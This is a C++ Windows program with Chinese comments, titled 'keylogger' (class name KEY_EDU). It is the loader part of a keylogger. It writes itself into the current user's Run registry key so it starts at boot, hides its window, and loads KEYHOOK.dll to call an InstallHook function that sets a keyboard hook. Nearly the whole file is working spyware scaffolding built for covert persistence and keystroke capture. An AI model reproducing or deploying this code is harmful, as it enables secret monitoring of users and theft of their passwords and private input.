#include <windows.h>
#include<string>
typedef BOOL(*P)();

//窗口处理函数
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
bool WriteToRegedit(HKEY hKey_, std::wstring path_, std::wstring key_, std::wstring value_);
bool SetBootStartUp(std::wstring key_, std::wstring path_);
std::wstring GetCurrentExecutableDirectory();


//入口函数
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//设计窗口类
	WNDCLASS wc = { 0 };
	TCHAR szAppClassName[] = TEXT("KEY_EDU");

	std::wstring path = GetCurrentExecutableDirectory() + L"\\KEY.exe";
	std::wstring key_ = L"KEYHOOK";
	SetBootStartUp(key_, path);
	//wc.hbrBackground = CreateSolidBrush(RGB(120, 50, 40)); //背景颜色
	wc.hInstance = hInstance;    //应用程序实例句柄
	wc.lpfnWndProc = WindowProc; //窗口处理函数
	wc.lpszClassName = szAppClassName; //窗口类型名
	wc.style = CS_HREDRAW | CS_VREDRAW; //窗口风格


	//注册窗口
	RegisterClass(&wc);

	//创建窗口
	HWND hWnd = CreateWindow(
		szAppClassName,      //窗口类型名
		TEXT("键盘记录器"),  //窗口标题名
		WS_OVERLAPPEDWINDOW, //窗口风格
		300,                 //窗口坐标（距离左边）
		200,                 //窗口坐标（距离上边）
		500,                 //窗口宽度
		300,                 //窗口高度
		NULL,                //父窗口句柄
		NULL,                //菜单句柄
		hInstance,           //应用程序实例句柄
		NULL                 //附加信息
	);


	//显示窗口(SW_HIDE 隐藏窗口)
	ShowWindow(hWnd,0);//隐藏
	//ShowWindow(hWnd, 1);//显示

	//更新窗口
	UpdateWindow(hWnd);

	//消息循环
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		//将虚拟键消息转换为字符消息
		TranslateMessage(&msg);

		//将消息分发给窗口处理
		DispatchMessage(&msg);
	}

	return 0;
}
std::wstring GetCurrentExecutableDirectory() {
	wchar_t buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);

	// 提取可执行文件所在的目录
	std::wstring executablePath(buffer);
	size_t lastSlashPos = executablePath.find_last_of(L"\\/");
	if (lastSlashPos != std::wstring::npos) {
		return executablePath.substr(0, lastSlashPos);
	}

	return L"";
}

bool WriteToRegedit(HKEY hKey_, std::wstring path_, std::wstring key_, std::wstring value_)
{
	HKEY hkey;
	::RegCreateKeyExW(hKey_,
		path_.c_str(),
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		NULL,
		&hkey,
		NULL);
	//
	::RegSetValueExW(hkey,
		key_.c_str(),
		0,
		REG_SZ,
		reinterpret_cast<LPBYTE>(const_cast<wchar_t*>(value_.c_str())),
		sizeof(std::wstring::value_type) * (value_.size() + 1));
	::RegCloseKey(hkey);
	return true;
}

// 设置开机自启动方法
// @param:key_:启动项名称
// @param:value_:启动文件路径
// return: false: 设置失败 true:设置成功
bool SetBootStartUp(std::wstring key_, std::wstring path_)
{
	return WriteToRegedit(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", key_, path_);
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CLOSE:   //窗口关闭消息
		DestroyWindow(hWnd);  //销毁窗口
		break;
	case WM_DESTROY:
		PostQuitMessage(0);       //退出窗口
		break;
	case WM_CREATE:      //窗口创建消息
		HMODULE hModule = ::LoadLibrary(TEXT("KEYHOOK.dll"));
		if (hModule != NULL)
		{
			P pfun = (P)::GetProcAddress(hModule, "InstallHook");
			if (pfun != NULL)
			{
				pfun();
			}
		}
		break;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}
